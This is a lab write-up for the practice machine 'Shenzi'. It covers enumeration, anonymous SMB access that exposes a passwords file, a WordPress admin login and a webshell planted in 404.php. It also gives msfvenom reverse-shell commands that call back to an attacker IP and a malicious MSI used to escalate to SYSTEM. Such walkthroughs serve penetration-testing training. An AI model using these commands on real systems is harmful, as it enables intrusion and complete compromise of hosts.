---
description: PG Practice Shenzi Writeup
---

# Shenzi

## Nmap

```
sudo nmap 192.168.235.55 -p- -sV -sS 

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
80/tcp   open  http          Apache httpd 2.4.43 
((Win64) OpenSSL/1.1.1g PHP/7.4.6)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.43 (
(Win64) OpenSSL/1.1.1g PHP/7.4.6)
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
5040/tcp open  unknown
```

As SMB is open we can run `smbclient` with no credentials to see if we can connect.

```
smbclient -U ''  -L \\\\192.168.235.55\\ 
```

After running the above command `smbclient` returns results showing a share called 'Shenzi'. We can connect to the share and then view the contents with the `dir` command.

```
smbclient -U ''  \\\\192.168.235.55\\Shenzi 
```

![](<../../../.gitbook/assets/image (830).png>)

From here I set the `recurse` command and `prompt off` before downloading all files for an easy single line download.

![](<../../../.gitbook/assets/image (831).png>)

The contents of passwords.txt of course proved to be interesting.

![](<../../../.gitbook/assets/image (832).png>)

Out of all of the credentials above the Wordpress one was potentially the most interesting considering further checks for phpmyadmin and webdav showed either the services are not running or inaccessible outside of local access on the target machine.

Running `dirsearch.py` against port 80 showed no interesting directories discovered.

![](<../../../.gitbook/assets/image (833).png>)

Knowing that Wordpress is potentially installed and that Wordpress sites do not generally have to exist in the directory of /wordpress/ I tried the Machine and SMB share name of Shenzi on port 80.

![http://192.168.235.55/shenzi/](<../../../.gitbook/assets/image (834).png>)

Now that we have a valid Wordpress site and some credentials we can try logging in. Heading over to [http://192.168.235.55/shenzi/wp-admin/](http://192.168.235.55/shenzi/wp-admin/) I was able to login with the credentials of `admin:FeltHeadwallWight357`

Heading over to Appearance > Theme editor I was able to edit the contents of the 404.php file and insert a webshell.

![http://192.168.235.55/shenzi/wp-admin/theme-editor.php?file=404.php\&theme=twentytwenty](<../../../.gitbook/assets/image (835).png>)

After saving changes and browsing to [http://192.168.235.55/shenzi/404.php](http://192.168.235.55/shenzi/404.php) we can see we now have a webshell and confirmed command execution.

![http://192.168.235.55/shenzi/404.php](<../../../.gitbook/assets/image (836).png>)

From here I created a `msfvenom` reverse shell:

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.235 LPORT=8082 -f exe > /home/kali/windows/reverseshell.exe`

Uploaded the file with the PHP webshell and set a `netcat` listener on port 21. After uploading the shell through the webshell I then executed and recieved a shell back.

![](<../../../.gitbook/assets/image (837) (1).png>)

After some initial enumeration I was unable to find anything interesting. I then turned to `winpeas` to look for any quick wins. Shortly after running I came into:

![](<../../../.gitbook/assets/image (838).png>)

With this we can create a malicious MSI file with `msfvenom` and when executed will be run in the context of SYSTEM.

First create a reverse shell MSI.

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.235 LPORT=21 -f msi > /home/kali/windows/priv.msi`

![](<../../../.gitbook/assets/image (839).png>)

Then set up a `netcat` listener on the attacking machine. Then using `certutil.exe` I downloaded the MSI and executed.

![](<../../../.gitbook/assets/image (840) (1).png>)

Then received a shell on the listener as SYSTEM.

![](<../../../.gitbook/assets/image (841).png>)
